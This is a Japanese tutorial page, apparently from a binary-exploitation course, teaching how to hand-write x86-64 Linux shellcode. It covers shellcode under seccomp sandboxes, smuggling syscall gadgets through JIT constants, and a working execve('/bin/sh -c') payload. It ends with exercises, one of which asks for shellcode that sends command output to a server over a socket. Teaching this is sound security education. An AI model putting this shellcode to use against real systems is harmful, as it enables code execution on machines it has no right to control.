---
title: シェルコードの書き方
date: 2021-12-20 22:15:00
tags:
    - [Linux]
    - [Userland]
    - [shellcode]
lang: ja

pagination: true
bk: ../introduction/environment.html
fd: restricted.html
---
Binary Exploitを勉強する際に最初に登場するシェルコードですが、CTFの場合ほとんどの問題では使いません。そのためシェルコードについて深く勉強できる資料は少ないですが、実際にはとても重要です。シェルコードの書き方をひよこ先生に教えてもらいましょう。

<div class="column" title="目次">
<!-- toc --><br>
</div>

## シェルコードはNXで消滅した？
シェルコードはもともと名前の通り、「シェルを起動する機械語」にちなんで登場した言葉ですが、実際には「攻撃に利用する機械語」程度の意味合いで使われています。言葉の定義はどうでも良いので、その内容を確認していきましょう。

シェルコードが他の手法よりも大きく優れているのは安定性です。関数ポインタを書き換えてsystem関数を呼び出したり、ROPによるコード実行は通常バイナリ依存となります。実世界の攻撃で、攻撃対象として動いているバイナリとまったく同じものを入手するのは困難なことが多いです。そのため、ROPを使う場合はバージョンごとにROP chainを分けてexploit中に記載します。しかし、シェルコードの場合はアドレスさえリークできていれば、そこへジャンプするだけで確実にコードが実行できます。

しかし、ご存知の通り、NXという考え方が登場してからはメモリ上のほとんどの領域がW^X[^1]になり、シェルコードが使えなくなりました。そのためCTFの問題では特に、関数ポインタの書き換えやROPが主流になり、シェルコードに関する問題は相当入門者向けのような状況でしか見なくなりました。ところが、実際にはシェルコードは非常に強力で、多くの状況で必要になってきます。

### サンドボックス下でのシェルコード
任意コマンドを実行するだけのような簡単なコードであればROPで事足りますが、場合によってはそうはいきません。近年多くのアプリがサンドボックス機構を取り入れるようになっています。Linuxの場合seccompが代表的な例でしょう。seccompはシステムコール番号などから使えるシステムコールを手軽に制限できる機能です。当然開発者は任意コマンド実行されたくないので、execveなどのシステムコールを禁止します。
このような場合、サンドボックスを回避したり、あるいはサンドボックス下で最大限悪用可能なコードを走らせるためにはシェルコードが必要になります。もちろんROPでも実現可能ですが、サンドボックスを回避するような複雑な処理であればシェルコードの方が楽でしょう。
つまり、複雑な処理が要求される状況においては、ROPを諦めてシェルコードで書いた方が圧倒的にexploitが簡潔になります。

### JITとシェルコード
ブラウザ（JavaScriptエンジン）のような大規模なアプリケーションになってくると実行時コンパイラ(JIT)が組み込まれています。JITは動的に機械語を生成する必要があるため、必然的に実行可能領域を割り当てます。

JITの中にはW^Xの考え方を実現していないものもあり、例えば2021年現在のChromeのJavaScriptエンジンであるV8は、WebAssemblyのコンパイル時に生成する機械語領域をRWXのまま使っています。このようにJITが作るRWXページは当然ながら攻撃の対象となっています。また、仮にW^Xだとしても、JITではほとんどの場合シェルコードが実現できます。
例えば次のように、32-bitの算術演算だけが許される電卓のような言語のJITが搭載されていたとしましょう。
```
x  = 32227377
x += 32193712
x -= 12780815
```
これをコンパイルすると次のようになるでしょう。
```
00h: B8 31 C0 EB 01    mov eax, 32227377
05h: 05 B0 3C EB 01    add eax, 32193712
0Ah: 2D 0F 05 C3 00    sub eax, 12780815
```
この領域は実行可能になりますが、電卓なので当然システムコール呼び出しのような機械語は生成されません。ところが、この何の問題もない機械語を2バイト目から解釈すると次のようになります。
```
01h: 31 C0    xor eax, eax
03h: EB 01    jmp 6h
05h: 05       db 05h
06h: B0 3C    mov al, 60
08h: EB 01    jmp Bh
0Ah: 2D       db 2Dh
0Bh: 0F 05    syscall
0Dh: C3       ret
```
eaxを60にしてシステムコールを呼び出す機械語になってしまいました。このように、JITが存在する場合は例えその領域が書き込み不能でも、中のコードで使われる定数をある程度制御できる場合、シェルコードやROP gadgetを攻撃者が用意できます。

<div class="balloon_l">
  <div class="faceicon"><img src="../img/piyo_jito.png" alt="ひよこ先生" ></div>
  <p class="says">
    このような手法を<strong>Bring Your Own Gadget</strong>などと呼ぶよ。
    対策として、定数を参照やエンコードした状態に置き換えて機械語中に登場させないConstant Blindingという手法があるよ。
  </p>
</div>

## シェルコードを書いてみよう
シェルコードが必要となったときに入門者が陥りやすいのが、shell-stormなどインターネットに転がっているシェルコードを使うことです。検索で上位に出てくるシェルコードの多くには以下の3つの特徴があります。

1. NULLバイトを使っていない
2. `/bin/sh`という文字列を使わない
3. なるべく短く書かれている

1は`strcpy`でもシェルコードがコピーされるようにという意図でしょうが、そのようなシェルコードが要求されることは滅多にありません。NULLバイトを使わないという制約は無駄です。
次に、`/bin/sh`という文字列を使わずxorやnotで組み立てるシェルコードが出回っています。これはエンコーダと呼ばれ、アンチウイルス等の検知を逃れる目的です。今回はそのようなPost-Exploitationの世界は対象としないので、このような制約は無駄です。
3つ目に、インターネット上のシェルコードの中には不思議なほど短さを意識しているものがあります。数バイト単位の字数制限が要求される状況は滅多にないどころか、極端に短いシェルコードはむしろ欠点があります。短いシェルコードはレジスタやスタックの初期状態を仮定している場合が多く、そのまま使おうとすると動かないケースがあります。短いけど動かないシェルコードを書くくらいなら、長くても読みやすいシェルコードを心がけましょう。

また、検索で出てくるシェルコードは「`/bin/sh`を起動する」であったり「リバースシェルを取る」であったり、一般的な状況で使えるように設計された典型的な処理が多いです。しかし、実際に要求されるのは状況に応じた複雑な処理ですし、そもそも典型的な処理すらすぐにアセンブリで書けないようではpawnyableの世界で生きていけません。（複雑なシェルコードは後の章で実践します。）

<div class="balloon_l">
  <div class="faceicon"><img src="../img/piyo_yaba.png" alt="ひよこ先生" ></div>
  <p class="says">
    自然界は厳しいのでコマンドを呼び出すシェルコードも手書きできないようでは生きていけない。
  </p>
</div>

ひよこ先生もそう言っているので、まずは例として`/bin/ls -lha`を呼び出すシェルコードを書いてみましょう。
ただし、実行するコマンドは簡単に置き換えられるようにしたいです。すなわち、

```c
char *args[] = {"/bin/sh", "-c", "/bin/ls -lha", NULL};
execve(args[0], args, NULL);
```

を実行させます。このシェルコードを書く際に必要となる技術は以下の3つだけです。

1. 文字列ポインタの取得
2. 引数リストの用意
3. システムコールの呼び出し

シェルコードをテストするためにはnasmとldを使いましょう。
```
$ nasm ls.S -o ls.o -fELF64
$ ld ls.o -o ls.elf
```

まず1つ目の文字列ポインタですが、よく見られるのがpush命令を使ってスタックに文字列を用意する例です。
```asm
mov rax, 0x0068732f6e69622f
push rax
```
64-bitにはlea命令があります。こちらの方が短くて済む上、文字列を8バイトごとに区切る手間が省けるので積極的に使いましょう。
```asm
; nasm test.S -fELF64
; ld test.o
_start:
  lea rdi, [rel s_arg0]
  ...
s_arg0: db "/bin/sh", 0
```
GCCでアセンブルする場合は、次のように書きます。（これより後はすべてNASM記法を採用します。）
```asm
// gcc test.S -masm=intel
.intel_syntax noprefix
.global main
main:
  lea rdi, [rip+s_arg0] // or s_arg0[rip]
  ...
s_arg0: .string "/bin/sh"
```
さらに短くしたいならcall命令を使っても良いです。
```asm
  call s_arg0
  db "/bin/sh", 0
s_arg0:
  pop rdi
```

次に引数リストの用意です。これは機械語領域が書き込み可能ならmov命令でも良いですし、そうでないならスタックでも良いです。配列の終端はNULLを入れるのを忘れないようにしましょう。
書き込み領域がない場合は先にmmapを呼んでデータ領域を確保しても構いません。
```
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  ...
s_arg2: db "/bin/ls -lha", 0
s_arg1: db "-c", 0
s_arg0: db "/bin/sh", 0
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/piyo_born.png" alt="ひよこ先生" ></div>
  <p class="says">
    x86-64では32-bitのレジスタに結果を代入すると自動的に64-bitに符号拡張されるよ。
    だから「xor eax,eax」で確実にraxを0にできるんだね。
  </p>
</div>

こちらもcall命令を利用することで短くできますが、可読性は若干失われます。
```
  xor edx, edx
  push rdx
  call s_arg2
  db "/bin/ls -lha", 0
s_arg2:
  call s_arg1
  db "-c", 0
s_arg1:
  call s_arg0
  db "/bin/sh", 0
s_arg0:
  mov rsi, rsp
```

最後にシステムコールです。raxがシステムコール番号、rdi, rsi, rdxの順に第一、第二、第三引数であることくらいは覚えておきましょう。`execve`が59番、`exit`が60番、`read`, `write`, `open`がそれぞれ0, 1, 2番など、よく使うシステムコール番号も覚えておければシェルコードを書くときに手が止まることはないです。

これだけで、文字列を変えればどんなコマンドでも実行できる便利なシェルコードができました。
```
global _start
section .text
_start:
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  mov eax, 59
  syscall
  int3

s_arg0: db "/bin/sh", 0
s_arg1: db "-c", 0
s_arg2: db "/bin/ls -lha", 0
```

Exploitから直接使えるようにしておくと便利です。
```python
from ptrlib import *

assembly = open("ls.S", "r").read()
shellcode = nasm(assembly, bits=64)
```

今回作ったシェルコードは[ここ](src/ls.S)からダウンロードできます。


[^1]: write(w)とexecute(x)が排他的(^)である、つまり書き込み可能かつ実行可能な領域は存在しないことを意味する言葉

----

<div class="column" title="例題１">
  <code>rep movsb</code>命令を使ってmemcpy相当のシェルコードを書いてください。
</div>
<div class="column" title="例題２">
  シェルコード領域は書き込み可能だがRSPの初期値が0から始まる状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。
  <pre>
; $ nasm test.S -fELF64
; $ ld test.o --omagic
; $ ./a.out
global _start
section .text
_start:
  xor esp, esp    ; 初期状態RSP=0
  lea rsp, [rel stack]
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  mov eax, 59
  syscall
  int3
stack: times 1024 dq 0
s_arg0: db "/bin/sh", 0
s_arg1: db "-c", 0
s_arg2: db "/bin/ls -lha", 0
  </pre>
  原因を特定して直してください。
</div>
<div class="column" title="例題３">
  「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。
  ただし、"/dev/tcp"などのスペシャルデバイスファイルは使わないこと。
  （ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）
</div>

[☞ 例題の解答](how2write-answer.html)
